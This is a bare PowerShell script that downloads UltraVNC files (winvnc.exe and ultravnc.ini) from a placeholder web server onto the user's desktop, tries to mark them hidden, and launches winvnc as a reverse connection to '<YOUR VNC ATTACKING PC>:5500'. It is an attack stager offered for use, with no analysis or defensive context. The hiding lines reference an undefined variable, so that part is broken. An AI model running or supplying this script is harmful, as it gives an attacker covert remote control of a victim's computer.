$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)

$url1 = "http://<YOUR WEB SERVER>/ultravnc.ini"
$file1 = Join-Path -Path $desktopPath -ChildPath "ultravnc.ini"

$url2 = "http://<YOUR WEB SERVER>/winvnc.exe"
$file2 = Join-Path -Path $desktopPath -ChildPath "winvnc.exe"

$url3 = "http://<YOUR WEB SERVER>/favicon.ico"
$file3 = Join-Path -Path $desktopPath -ChildPath "favicon.ico"

Invoke-WebRequest -Uri $url1 -OutFile $file1
Set-ItemProperty -Path $filePath -Name Attributes -value ([System.IO.FileAttributes]::Hidden)
Invoke-WebRequest -Uri $url2 -OutFile $file2
Set-ItemProperty -Path $filePath -Name Attributes -value ([System.IO.FileAttributes]::Hidden)
Invoke-WebRequest -Uri $url3 -OutFile $file3
Set-ItemProperty -Path $filePath -Name Attributes -value ([System.IO.FileAttributes]::Hidden)

$params = "-connect <YOUR VNC ATTACKING PC>:5500"

try {
    Start-Process -FilePath $file2 -ArgumentList $params
} catch {
    Write-Error "Failed to start process: $_"
}
